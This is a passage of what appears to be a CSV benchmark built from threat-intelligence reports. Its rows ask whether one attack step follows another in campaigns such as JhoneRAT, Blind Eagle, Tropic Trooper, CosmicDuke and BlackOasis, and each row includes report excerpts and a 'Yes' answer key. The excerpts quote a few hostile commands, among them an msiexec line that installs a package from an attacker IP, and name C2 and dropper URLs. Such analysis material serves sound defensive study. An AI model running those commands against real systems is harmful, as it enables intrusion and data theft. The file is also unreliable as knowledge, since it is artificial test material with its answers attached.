Others: PKPLUG has been active for at least six years, using a variety of malware families, including PlugX, Poison Ivy, Zupdax, 9002, HenBox, and Farseer. The group targets countries and regions in and around Southeast Asia, with potential motivations related to the ASEAN organization, China's Belt and Road Initiative, and disputes over the South China Sea. Unit 42 of Palo Alto Networks has been tracking PKPLUG for three years and believes with high confidence that it has origins linked to Chinese nation-state adversaries. The group's use of Android malware indicates an intent to target environments where traditional computing and communication methods differ.",Yes,PKPLUG_ Chinese Cyber Espionage Group Attacking Asia
1241,258,258-Initial Access-T1659-Content Injection,"After JhoneRAT achieves initial access using malicious Microsoft Office documents hosted on Google Drive, is it likely that the campaign will execute a Macro to download a base64-encoded binary before achieving persistence by creating a 'ChromeUpdater' entry in the Windows registry?","Initial Access: The JhoneRAT campaign begins with malicious Microsoft Office documents that are designed to download an additional Office document containing a Macro. These documents are hosted on Google Drive. The earliest document, named 'Urgent.docx' from November 2019, prompts users to enable editing in English and Arabic. Another document named 'fb.docx' from early January contains alleged Facebook usernames and passwords. A more recent document from mid-January appears to be from a United Arab Emirates organization and asks users to enable editing to view blurred content.","Execution: The malicious Office document's Macro executes only if a disk serial number is detected, which is a technique to avoid virtual machine detection. The Macro then downloads an image from Google Drive, which contains a base64-encoded binary appended at the end, separated by the string '****'. The binary is an AutoIT script that downloads a new file from Google Drive.
Persistence: The final payload, JhoneRAT, written in Python, creates persistence by adding an entry named 'ChromeUpdater' to the 'Software\Microsoft\Windows\CurrentVersion\Run' registry key.
Defense Evasion: JhoneRAT includes techniques to avoid execution on virtual machines by checking for disk serial numbers. Additionally, the Python bytecode header is removed to hinder analysis by tools such as uncompyle6.
Discovery: JhoneRAT checks the system's keyboard layout to target specific Arabic-speaking countries, including Saudi Arabia, Iraq, Egypt, Libya, Algeria, Morocco, Tunisia, Oman, Yemen, Syria, UAE, Kuwait, Bahrain, and Lebanon.
Command and Control: JhoneRAT uses cloud services for command and control activities. It checks for new commands in tweets from the handle @jhone87438316 every 10 seconds using BeautifulSoup. Commands can be issued to specific victims based on a UID generated on each target or to all victims.
Exfiltration: JhoneRAT exfiltrates screenshots via ImgBB and sends command execution feedback to Google Forms. It can also download files encoded in base64 from Google Drive.
Others: The JhoneRAT campaign is focused on specific Middle Eastern and Arabic-speaking countries and leverages cloud providers for operations. The campaign started in November 2019 and is ongoing. The attackers have implemented anti-VM and anti-analysis tricks. The campaign demonstrates the importance of network-based detection complemented by system behavior analysis. The threat actors' infrastructure includes URLs hosted on Google Drive and a Twitter account. Cisco Talos Intelligence Group provides various ways to detect and block this threat, including Advanced Malware Protection (AMP), Cisco Cloud Web Security (CWS), Email Security, Network Security appliances, AMP Threat Grid, Umbrella, and the Open Source Snort Subscriber Rule Set.",Yes,JhoneRAT_ Cloud based python RAT targeting Middle Eastern countries
1260,260,260-Initial Access-T1566-Phishing,"After leveraging Discord CDNs to host the subsequent stage script, is it likely that Blind Eagle will execute a PowerShell script to load a DLL containing an AMSI bypass method and create a registry key as part of the next stage before establishing persistence via a VBScript placed in the Startup folder?","Initial Access: In the first stage, Blind Eagle utilizes a JavaScript downloader that employs ActiveXObject to execute PowerShell commands. The group leverages Discord CDNs to host the subsequent stage script, specifically downloading and executing a script from the URL 'hxxp://cdn.discordapp[.]com/attachments/940363101067411527/946390049979781130/cacha.pdf'.","Execution: The second stage involves a PowerShell script that begins by loading a DLL into memory from an obfuscated and Base64 encoded string. This DLL, a .NET portable executable, contains a method named Bypass(), which serves as an AMSI (AntiMalware Scan Interface) bypasser. Upon successful bypass, the message 'bypass' is displayed in the console, while any exceptions during execution are caught and their messages are output to the console. The PowerShell script then checks for the presence of the registry key HKCU:\software\wow6432node\Microsoft\WindowsUpdate. If absent, the script creates the key and sets an obfuscated value without deobfuscation. It proceeds to drop two files: a PowerShell script named myScript.ps1 and a batch file named SystemLogin.bat. Finally, a VBScript named Login1.vbs is placed in the Startup folder to execute upon system start, which in turn executes the previously dropped SystemLogin.bat. The fourth stage reveals an obfuscated batch script that, when deobfuscated, executes the myScript.ps1 PowerShell script using the command 'mshta """"powershell 'C:\Users\Public\myScript.ps1'"""", 0:close')' and a VBScript execution command. The fifth stage involves another PowerShell script that loads the same AMSIBypasser DLL from the second stage and calls its method. It then loads a second DLL, an AES256 Decryptor, to decrypt the contents of the HKCU:\software\wow6432node\Microsoft\WindowsUpdate registry key using the passphrase '5456846176463687555'. The decrypted content is a new PowerShell script leading to njRAT, a remote access tool (RAT) known as Bladabindi, which allows the attacker to control the victim's computer.
Persistence: The third stage involves a VBScript named Login1.vbs placed in the Startup folder, which ensures the execution of the SystemLogin.bat batch file upon system startup.
Defense Evasion: The PowerShell script in the second stage includes an AMSI bypass method, which is a defense evasion technique. Additionally, the obfuscation of scripts and registry values serves as a means to evade detection.
Command and Control: The final PowerShell script in the fifth stage leads to njRAT, which is a remote access tool (RAT) that establishes command and control over the victim's computer.
Others: APT Blind Eagle, also known as APT-C-36, is a suspected South American espionage group active since at least 2018, targeting Colombian government institutions and corporations in the financial, petroleum, and professional manufacturing sectors. They employ sophisticated attack techniques, including custom malware, social engineering, spear-phishing, and zero-day exploits. Indicators of compromise (IoCs) and a YARA rule authored by 'seyitsec' on 2023-04-16 have been provided to detect and defend against Blind Eagle's attacks. The YARA rule includes hashes and strings to identify the malware stages, and the IoCs list includes SHA256 hashes of malicious files and a malicious URL hosted on Discord's CDN. The MITRE ATT&CK framework identifies the tactics used by Blind Eagle, including PowerShell (T1059.001), Scripting (T1064), Startup Folder (T1547.001), Process Injection (T1055), Masquerading (T1036), Sandbox Evasion (T1497), and Application Layer Protocol (T1071).",Yes,APT_Blind_Eagles_Malware_Arsenal_Technical_Analysis_of_the_New
1276,262,262-Initial Access-T1190-Exploit Public-Facing Application,"After Tropic Trooper exploited either CVE-2017-11882 or CVE-2018-0802 to gain initial access, is it likely that the system configuration file dropped a backdoor installer (UserInstall.exe) before the malicious DLL loader (wab32res.dll) was used to inject a DLL backdoor into dllhost.exe?","Initial Access: Tropic Trooper, also known as KeyBoy, executed commands through exploits for CVE-2017-11882 or CVE-2018-0802, which are security flaws in Microsoft Office's Equation Editor (EQNEDT32.EXE). They downloaded an installer package (.msi) and installed it on the system by executing the command: /c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]).","Execution: The system configuration file (in.sys) dropped a backdoor installer (UserInstall.exe) then deleted itself. The backdoor installer dropped a normal sidebar.exe file (a Windows Gadget tool), a malicious loader (in""C:\ProgramData\Apple\Update\wab32res.dll""), and an encrypted configuration file. UserInstall.exe abused the BITSadmin command-line tool to create a job and launch sidebar.exe. The malicious loader used dynamic-link library (DLL) hijacking on sidebar.exe and launched dllhost.exe (a normal file). The loader then injected a DLL backdoor into dllhost.exe. Malicious documents that don't need to download anything from the internet as the backdoor's dropper is already embedded in the document were also observed.
Persistence: The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers.
Defense Evasion: Tropic Trooper used DLL hijacking to evade antivirus detection, as the malicious wab32res.dll was loaded by a benign file, sidebar.exe. The installer dropped three files into the Apple/Update directory and created one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. The loader, named FakeRun, executed dllhost.exe and injected one malicious DLL file, which is the backdoor, into this process.
Command and Control: TClient used SSL to connect to Tropic Trooper's C&C server. The C&C server and some configuration values are not hardcoded in the backdoor, allowing Tropic Trooper's operators to easily change/update the C&C server and configure other values. TClient is one of Tropic Trooper's backdoors, which uses symmetric encryption to decrypt its configuration with a 16-byte key. TClient uses custom SSL libraries to connect the C&C server.
Others: Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware to targets. These documents use job vacancies in organizations that may be deemed socio-politically sensitive to recipients. The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB). Another PDB string found is D:\Work\Project\VS\house\Apple\Apple_20180115\Release\InstallClient.pdb. At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse. It would then use sidebar.exe to load the malicious wab32res.dll (TROJ_TCLT.ZDFB) through DLL hijacking. This is carried out to evade antivirus (AV) detection, because wab32res.dll is loaded by a benign file. Reverse analysis of TClient allowed us to determine how to decrypt the C&C information. TClient will use custom SSL libraries to connect the C&C server. We also found another SSL certificate on this C&C server. A closer look reveals that it was registered quite recently, and is set to expire after a year, suggesting Tropic Trooper's use or abuse of components or services that elapse so they can leave as few traces as possible.",Yes,Tropic Trooper’s New Strategy
1287,263,263-Defense Evasion-T1027-Obfuscated Files or Information,"After the initial access gained by embedding encoded PowerShell scripts within a malicious Microsoft Word document and executing these scripts through macro-triggered events, is it likely that the campaign will use decoded scripts to drop components like invoker.ps1 for persistence before employing obfuscation methods for the backdoor payload as part of defense evasion?","Defense Evasion: The campaign employs obfuscation methods for the macro scripts, resulting in an intended backdoor payload. This method is commonly used in samples associated with the MuddyWater campaign.","Initial Access: The MuddyWater campaign, first identified in 2017, has been observed using a new sample (Detected as W2KM_DLOADR.UHAOEEN) in May 2018, which utilizes a Microsoft Word document embedded with a malicious macro. This macro is designed to execute PowerShell scripts leading to a backdoor payload, notably without downloading additional component files but encoding all scripts within the document itself.
Execution: Upon enabling the macro within the lure document, the Document_Open() event triggers the execution of the malicious routine. This involves the use of three main functions: one to execute sub-functions, another to manipulate images in the document, and a third to construct and execute the main PowerShell commands and scripts.
Persistence: The PowerShell script decodes the contents of the malicious document and executes another encoded PowerShell script. This results in readable scripts that drop various components into the %Application Data%\Microsoft\CLR\* directory. The main PowerShell file, invoker.ps1, uses these components to run the final payload, PRB-Backdoor.
Command and Control: The PRB-Backdoor communicates with its Command-and-Control (C&C) server, hxxp://outl00k[.]net, to send and receive commands for various purposes, including initializing connection, registering the machine, gathering browsing histories, stealing passwords, reading and writing files, executing shell commands, recording keyboard strokes, capturing screenshots, updating functions, and gathering system information.
Others: The MuddyWater campaign targets users through phishing or spam, using lure documents designed with social engineering tactics. Trend Micro solutions such as Deep Discovery, Hosted Email Security, Deep Discovery Email Inspector, InterScan Web Security, and Smart Protection Suites provide protection against such attacks. The campaign has evolved its tools and techniques to be more effective and persistent, with the latest sample indicating a shift in the subject matter of lure documents, suggesting a broader range of targets.",Yes,another-potential-muddywater-campaign-uses-powershell-based-prb-backdoor
1302,265,265-Credential Access-T1003-OS Credential Dumping,"After using software packing to obfuscate the payload and deleting the original file post-infection for defense evasion, is it likely that SWEED’s malware, educrety.exe, will drop a PE file before using credential dumping techniques to search for OS credentials in registry keys?","Credential Access: The dropped PE file, educrety.exe, searched for stored passwords and access tokens in various registry keys, using techniques such as T1003 (Credential Dumping), T1081 (Credentials in Files), and T1214 (Credentials in Registry).","Initial Access: On 2019-10-26, a precision engineering company in Italy received a well-crafted email from steel@vardhman.com, which appeared to be from a legitimate company in the textile field. The email contained an attached Excel document requesting a quote for a list of spare parts, leveraging a tactic known as Spearphishing Attachment (T1193).
Execution: Upon opening the Excel document, the victim would see a realistic-looking spreadsheet without any macro code, thus not raising suspicion. However, the document contained a hidden object exploiting CVE-2017-11882, allowing silent code execution without user interaction (T1204 - User Execution).
Defense Evasion: The attack employed several defense evasion techniques: T1107 (File Deletion) by deleting the original file after infection, T1158 (Hidden Files and Directories), and T1045 (Software Packing) as the threat came packed/encrypted.
Collection: The malware collected data from the local system (T1005 - Data from Local System).
Command and Control: The stolen credentials were sent to a command and control server at http[://www.corpcougar.com/edu/Panel/five/fre.php using common ports and standard application layer protocols (T1043 - Commonly Used Port and T1071 - Standard Application Layer Protocol).
Exfiltration: The data was encrypted before being exfiltrated (T1002 - Data Encrypted).
Others: The attack is attributed to a threat actor known as SWEED, which has similarities to previous campaigns and targets precision engineering companies in Italy. The malware used in the attack includes a dropped PE file with hash 64114c398f1c14d4e840f62395edd9a8c43d834708f8d8fce12f8a6502b0e981 and a malicious document with hash 863934c1fa4378799ed0c3e353603ba0bee3a357a5c63d845fe0d7f4ebc1a64c. The dropping URL is http[://mail.hajj.zeem.sa/wp-admin/edu/educrety.exe. The attack also involved the use of a Microsoft Office exploit and implementation of LokiBot.",Yes,SWEED Targeting Precision Engineering Companies in Italy
1303,265,265-Credential Access-T1552-Unsecured Credentials,"After the malware collected data from the local system, is it likely that educrety.exe searched for credentials in files and the registry to gain access before exfiltrating the encrypted data to the command and control server?","Credential Access: The dropped PE file, educrety.exe, searched for stored passwords and access tokens in various registry keys, using techniques such as T1003 (Credential Dumping), T1081 (Credentials in Files), and T1214 (Credentials in Registry).","Initial Access: On 2019-10-26, a precision engineering company in Italy received a well-crafted email from steel@vardhman.com, which appeared to be from a legitimate company in the textile field. The email contained an attached Excel document requesting a quote for a list of spare parts, leveraging a tactic known as Spearphishing Attachment (T1193).
Execution: Upon opening the Excel document, the victim would see a realistic-looking spreadsheet without any macro code, thus not raising suspicion. However, the document contained a hidden object exploiting CVE-2017-11882, allowing silent code execution without user interaction (T1204 - User Execution).
Defense Evasion: The attack employed several defense evasion techniques: T1107 (File Deletion) by deleting the original file after infection, T1158 (Hidden Files and Directories), and T1045 (Software Packing) as the threat came packed/encrypted.
Collection: The malware collected data from the local system (T1005 - Data from Local System).
Command and Control: The stolen credentials were sent to a command and control server at http[://www.corpcougar.com/edu/Panel/five/fre.php using common ports and standard application layer protocols (T1043 - Commonly Used Port and T1071 - Standard Application Layer Protocol).
Exfiltration: The data was encrypted before being exfiltrated (T1002 - Data Encrypted).
Others: The attack is attributed to a threat actor known as SWEED, which has similarities to previous campaigns and targets precision engineering companies in Italy. The malware used in the attack includes a dropped PE file with hash 64114c398f1c14d4e840f62395edd9a8c43d834708f8d8fce12f8a6502b0e981 and a malicious document with hash 863934c1fa4378799ed0c3e353603ba0bee3a357a5c63d845fe0d7f4ebc1a64c. The dropping URL is http[://mail.hajj.zeem.sa/wp-admin/edu/educrety.exe. The attack also involved the use of a Microsoft Office exploit and implementation of LokiBot.",Yes,SWEED Targeting Precision Engineering Companies in Italy
1316,268,268-Command and Control-T1071-Application Layer Protocol,"After using document-based exploits to deceive victims into opening malicious PDF files and executing the malware with updated loaders inherited from MiniDuke, is CosmicDuke likely to collect information through keylogging, screenshotting, and clipboard stealing before communicating with remote servers via FTP and WebDav for exfiltration and updating?","Command and Control: CosmicDuke communicates with remote servers via HTTP GET requests and uses FTP and WebDav servers for exfiltrating collected data and updating the malware. The configuration, which includes server IPs, URLs, and credentials, is embedded in the info-stealer and compressed using an algorithm similar to LZNT-1.","Initial Access: CosmicDuke infections begin by deceiving victims into opening a PDF file containing an exploit or a Windows executable disguised as a document or image file. The attackers utilize social engineering and document-based exploits to achieve this. The document-based exploit involves a malicious Flash object embedded in a PDF file that exploits the CVE-2011-0611 vulnerability in Adobe Flash, Reader, and Acrobat products. Social engineering tactics involve disguising the executable file as an image or document and displaying a decoy document or image to distract the user while the malware installs silently in the background.
Execution: The CosmicDuke samples analyzed use the same loader as MiniDuke's stage 3 samples. This loader was first seen with a compilation date of March 24, 2011, predating the oldest documented MiniDuke sample. The most common compilation date for loaders that load the Cosmu malware is November 13, 2012. The MiniDuke loader was updated, and CosmicDuke samples began using the updated loader in mid-April 2014, a few months after MiniDuke started using it in mid-December 2013.
Persistence: CosmicDuke achieves persistence on the system by creating a scheduled task named 'Watchmon Service' and installing a Windows service with the name 'javamtsup' and the display name 'Java(TM) Virtual Machine Support Service.' The service binary's size on disk varies, but typically the real size is 5120 bytes. The service opens a handle to the explorer.exe process, duplicates its process token, reads the path of the actual malware binary from the registry, and starts the malware using the duplicated token. The malware copies itself to %WINDIR%\system32 with various filenames generated by combining two items from a predefined list.
Credential Access: CosmicDuke targets a variety of software to steal credentials, including Skype, Google Talk, MSN Messenger, Google Chrome, Internet Explorer, Firefox, Thunderbird, Bat email client, Outlook Express, Outlook, and Google Desktop. It also steals Windows credentials such as LM and NT hashes, cached domain passwords, LSA secrets, and plain text keys for WLANs. Additionally, it exports certificates and associated private keys from the system store using the password 'saribas' to encrypt the exported data.
Discovery: CosmicDuke searches for files on hard drives and network drives that match specific patterns, including various document, archive, and other file types. It also targets non-English filenames, particularly those that include the words 'sifr' and 'sifer,' which are related to encryption ciphers in many languages.
Collection: CosmicDuke collects information using a keylogger, screenshotter, and clipboard stealer. It also searches removable drives for files, skipping certain file types and drives with the volume name 'trandescend.'
Exfiltration: The information collected by CosmicDuke is automatically uploaded to remote servers via FTP. The report details the login credentials used and the FTP folder structure of the remote sites contacted by CosmicDuke. Most of these remote sites were live at the time of writing.",Yes,cosmicduke_whitepaper
1324,268,268-Collection-T1113-Screen Capture,"After searching removable drives and skipping certain file types during collection, is CosmicDuke likely to use a keylogger, screenshotter, and clipboard stealer to gather information before exfiltrating the collected data to remote servers via FTP?","Collection: CosmicDuke collects information using a keylogger, screenshotter, and clipboard stealer. It also searches removable drives for files, skipping certain file types and drives with the volume name 'trandescend.'","Initial Access: CosmicDuke infections begin by deceiving victims into opening a PDF file containing an exploit or a Windows executable disguised as a document or image file. The attackers utilize social engineering and document-based exploits to achieve this. The document-based exploit involves a malicious Flash object embedded in a PDF file that exploits the CVE-2011-0611 vulnerability in Adobe Flash, Reader, and Acrobat products. Social engineering tactics involve disguising the executable file as an image or document and displaying a decoy document or image to distract the user while the malware installs silently in the background.
Execution: The CosmicDuke samples analyzed use the same loader as MiniDuke's stage 3 samples. This loader was first seen with a compilation date of March 24, 2011, predating the oldest documented MiniDuke sample. The most common compilation date for loaders that load the Cosmu malware is November 13, 2012. The MiniDuke loader was updated, and CosmicDuke samples began using the updated loader in mid-April 2014, a few months after MiniDuke started using it in mid-December 2013.
Persistence: CosmicDuke achieves persistence on the system by creating a scheduled task named 'Watchmon Service' and installing a Windows service with the name 'javamtsup' and the display name 'Java(TM) Virtual Machine Support Service.' The service binary's size on disk varies, but typically the real size is 5120 bytes. The service opens a handle to the explorer.exe process, duplicates its process token, reads the path of the actual malware binary from the registry, and starts the malware using the duplicated token. The malware copies itself to %WINDIR%\system32 with various filenames generated by combining two items from a predefined list.
Credential Access: CosmicDuke targets a variety of software to steal credentials, including Skype, Google Talk, MSN Messenger, Google Chrome, Internet Explorer, Firefox, Thunderbird, Bat email client, Outlook Express, Outlook, and Google Desktop. It also steals Windows credentials such as LM and NT hashes, cached domain passwords, LSA secrets, and plain text keys for WLANs. Additionally, it exports certificates and associated private keys from the system store using the password 'saribas' to encrypt the exported data.
Discovery: CosmicDuke searches for files on hard drives and network drives that match specific patterns, including various document, archive, and other file types. It also targets non-English filenames, particularly those that include the words 'sifr' and 'sifer,' which are related to encryption ciphers in many languages.
Command and Control: CosmicDuke communicates with remote servers via HTTP GET requests and uses FTP and WebDav servers for exfiltrating collected data and updating the malware. The configuration, which includes server IPs, URLs, and credentials, is embedded in the info-stealer and compressed using an algorithm similar to LZNT-1.
Exfiltration: The information collected by CosmicDuke is automatically uploaded to remote servers via FTP. The report details the login credentials used and the FTP folder structure of the remote sites contacted by CosmicDuke. Most of these remote sites were live at the time of writing.",Yes,cosmicduke_whitepaper
1332,269,269-Lateral Movement-T1021-Remote Services,"After using compromised legitimate websites as C2 servers for communication with the infected devices, is the attacker likely to confirm communication with the target device via a ping command before attempting lateral movement using the net use command?","Lateral Movement: After confirming communication with the target device via a ping command using the version RAT remote shell, the attacker attempted lateral movement with a net use command.","Initial Access: In September 2019, the Tick group targeted the Chinese offices of Japanese chemical industry organizations using spear phishing emails with an attachment containing the version RAT malware. In December 2019, media companies received spear phishing emails disguised as New Year's greetings, which delivered the LODEINFO malware when the embedded macro was activated. In January 2020, defense-related organizations were targeted with spear phishing emails carrying an Office macro file designed to drop LODEINFO malware.
Execution: The version RAT malware, developed to run only in a Windows 10 environment, includes remote-controlled functions such as execution of a remote shell, file uploading, and file downloading. LODEINFO malware operates by injecting malicious code into a svchost.exe process and possesses a command set similar to Unix commands.
Persistence: The version RAT malware uses DLL Search Order Hijacking to ensure it is automatically run and remains on the infected device after reboot. LODEINFO malware adds values to the Run registry to ensure it is automatically executed after the infected device is rebooted.
Defense Evasion: The version RAT malware uses a unique technique to identify the OS of the infected device, preventing it from running on any OS other than Windows 10. This technique is effective in circumventing dynamic analysis and sandbox-based security. LODEINFO malware is developed based on benign source code to escape analysis.
Command and Control: The version RAT malware uses compromised legitimate websites as C2 servers, with communication data encrypted by AES and base64. LODEINFO malware regularly carries out HTTP POST communication to the C2 server and processes instructions included in the response.
Others: In February 2020, BlackTech's 32bit ELF malware running on Linux OS was uploaded to a public malware repository, indicating a possible victim in the IT service industry. The malware is similar to TsCookie, one of BlackTech's tools. Other tools discovered include a WebShell, a port forwarding tool, a GoogleAPI token updater, and a Linux version of Bifrose malware.",Yes,mpressioncss_ta_report_2019_4_en
1337,27,27-Execution-T1203-Exploitation for Client Execution,"After delivering a malicious Microsoft Office document containing a Flash zero-day exploit via email for initial access, is it likely that BlackOasis will execute the second stage shellcode after the Flash object within the document uses ActionScript to extract the exploit?","Execution: The Flash object within the Office document contained an ActionScript responsible for extracting the exploit using a custom packer seen in other FinSpy exploits. The exploit, a memory corruption vulnerability in the 'com.adobe.tvsdk.mediacore.BufferControlParameters' class, allowed arbitrary read/write operations in memory, enabling the execution of a second stage shellcode.","Initial Access: On October 10, 2017, Kaspersky Lab identified a new Adobe Flash zero-day exploit used in the wild against their customers. The exploit was delivered through a Microsoft Office document.
Defense Evasion: The FinSpy malware payload used anti-analysis techniques, including a custom packer and a virtual machine to execute code. The malware's virtual machine supported 34 instructions and was designed to execute native code specified in the parameter field.
Command and Control: The initial shellcode's main purpose was to download second stage shellcode from a specified URL. The final payload, 'mo.exe', communicated with three C2 servers for further control and exfiltration of data. Two of these C2 servers had been used in the past with other FinSpy payloads.
Exfiltration: The second stage shellcode downloaded the final payload (FinSpy) and a lure document to display to the victim from the same IP, then executed the payload and displayed the lure document.
Others: The attack was linked to the BlackOasis APT, which has been active since at least June 2015, utilizing at least five zero-days to deliver FinSpy malware. BlackOasis targets figures involved in Middle Eastern politics and other regions, with victims observed in multiple countries. Kaspersky Lab has reported the vulnerability to Adobe, resulting in a patch. Users of Kaspersky products are protected against this threat by specific detections. The article acknowledges Adobe PSIRT for their cooperation.",Yes,BlackOasis
1340,27,27-Command and Control-T1104-Multi-Stage Channels,"After the initial Flash zero-day exploit gains arbitrary read/write memory capabilities to execute a second stage shellcode, is it likely that the second stage shellcode will then download the final payload (FinSpy) and establish communication with C2 servers for further control?","Command and Control: The initial shellcode's main purpose was to download second stage shellcode from a specified URL. The final payload, 'mo.exe', communicated with three C2 servers for further control and exfiltration of data. Two of these C2 servers had been used in the past with other FinSpy payloads.","Initial Access: On October 10, 2017, Kaspersky Lab identified a new Adobe Flash zero-day exploit used in the wild against their customers. The exploit was delivered through a Microsoft Office document.
Execution: The Flash object within the Office document contained an ActionScript responsible for extracting the exploit using a custom packer seen in other FinSpy exploits. The exploit, a memory corruption vulnerability in the 'com.adobe.tvsdk.mediacore.BufferControlParameters' class, allowed arbitrary read/write operations in memory, enabling the execution of a second stage shellcode.
Defense Evasion: The FinSpy malware payload used anti-analysis techniques, including a custom packer and a virtual machine to execute code. The malware's virtual machine supported 34 instructions and was designed to execute native code specified in the parameter field.
Exfiltration: The second stage shellcode downloaded the final payload (FinSpy) and a lure document to display to the victim from the same IP, then executed the payload and displayed the lure document.
Others: The attack was linked to the BlackOasis APT, which has been active since at least June 2015, utilizing at least five zero-days to deliver FinSpy malware. BlackOasis targets figures involved in Middle Eastern politics and other regions, with victims observed in multiple countries. Kaspersky Lab has reported the vulnerability to Adobe, resulting in a patch. Users of Kaspersky products are protected against this threat by specific detections. The article acknowledges Adobe PSIRT for their cooperation.",Yes,BlackOasis
1354,273,273-Execution-T1059-Command and Scripting Interpreter,"After the NewsBeef group gains initial access through spearphishing and watering hole attacks using malicious macro-enabled Office documents, is it likely that PowerShell scripts will download poisoned installers, which then execute PowerSploit scripts that subsequently download and run the Pupy backdoor as part of the campaign's execution phase?","Execution: The NewsBeef campaign utilized spearphishing with malicious Office documents to execute PowerShell scripts, which then downloaded poisoned installers for Flash, Citrix Client, and Chrome. These installers executed PowerSploit scripts to download and run the Pupy backdoor.","Initial Access: The NewsBeef APT group, also known as APT33, engaged in spearphishing and watering hole attacks targeting Saudi Arabian entities. They used malicious macro-enabled Microsoft Office documents, PowerSploit, and the Pupy backdoor to gain initial access. The documents were delivered via email and social media/messaging applications, while compromised high-profile websites, including some belonging to the Saudi government, were injected with JavaScript to redirect visitors to attacker-controlled web servers.
Defense Evasion: The NewsBeef APT improved their JavaScript injection and obfuscation techniques, which may have extended their server persistence and made it more difficult to identify the malicious JavaScript source on compromised sites.
Command and Control: The Pupy backdoor communicated with the command and control server using the obfs3 protocol, which is used to mask Tor communications. This indicates the attackers' understanding of its effectiveness against outbound connection monitoring.
Others: The NewsBeef APT group, identified as APT33, has historically used the Browser Exploitation Framework (BeEF) but shifted to a new toolset including macro-enabled Office documents, PowerSploit, and Pupy. They compromised a larger number of sites, including valuable Saudi government identities, and continued to rely on social engineering. The group's specific target set suggests that Saudi security teams should update their web applications and plugins to protect against this APT's activities. The group is expected to continue targeting Saudi Arabian organizations and may expand to other organizations connected to Saudi interests.",Yes,Twas the night before
1371,275,275-Credential Access-T1606-Forge Web Credentials,"After using social media platforms for long-term monitoring via benign emails and tracking via tools like Wasmyemailread[.]com during the Reconnaissance phase, is it likely that WINDSHIFT APT will send emails mimicking legit password recovery pages or use SMS to redirect to credential harvesting landing pages employing HTTPS with free SSL certificates during the Credential Access phase?","Credential Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.","Reconnaissance: PART III: WINDSHIFT APT   Phase 1: RECON   Duration: 1-2 years   - Fake personas on social platforms (LinkedIn, Facebook, Twitter, Instagram, Google Plus) to gather identifiable information, emails, phone numbers, friends contacts.  - Use of social media mobile apps to steal contact list, emails, and SMS contents.   Phase 2: RECON   Duration: 6 months   - Long term monitoring of targets via benign emails to understand click habits, subjects of interests, geo-locating targets, and email click rate.  - Use of mailing lists, sending daily emails duplicating content of local media to build content habit and relationship with the target.   - Tracking via Wasmyemailread[.]com and ifread[.]com.
Initial Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Execution: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.
Command and Control: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.",Yes,In the Trails of WINDSHIFT APT
1381,277,277-Reconnaissance-T1595-Active Scanning,"After using Shodan and Censys to discover publicly available resources of medical organizations, is it likely that cybercriminals would proceed to uncover outdated Building Management systems or medical devices supporting the MQTT protocol in the medical networks' perimeters?","Reconnaissance: The CTI report by Denis Makrushin and Yury Namestnikov, dated March 13, 2018, details the reconnaissance efforts of cybercriminals targeting medical networks. The authors describe the use of masscan to identify potential entry points into medical infrastructure by extracting IP ranges associated with medical-related keywords. They also mention the use of specialized search engines like Shodan and Censys to find publicly available resources of these organizations. The report highlights the discovery of non-trivial ports and services, such as Building Management systems using the Niagara Fox protocol and printers with web interfaces without authentication, which could be exploited for further reconnaissance.","Discovery: The report discusses the discovery of various services on medical network perimeters, including outdated Building Management systems and printers with unprotected web interfaces. It also notes the presence of medical devices like spirometers or blood pressure monitors that support MQTT protocol and are discoverable online, indicating a potential for unauthorized access and control.
Others: The report provides an overview of the threats affecting medical networks, with statistics showing that over 60% of medical organizations had malware on their servers or computers in 2017. It also discusses the targeting of pharmaceutical organizations by APT actors using malware like PlugX and Cobalt Strike to exfiltrate data, suggesting an interest in intellectual property or business plans. The authors recommend removing medical data nodes from public access, updating software, and avoiding connecting expensive equipment to the main LAN as measures to mitigate these threats.",Yes,therapeutic_postmortem_of_connected_medicine
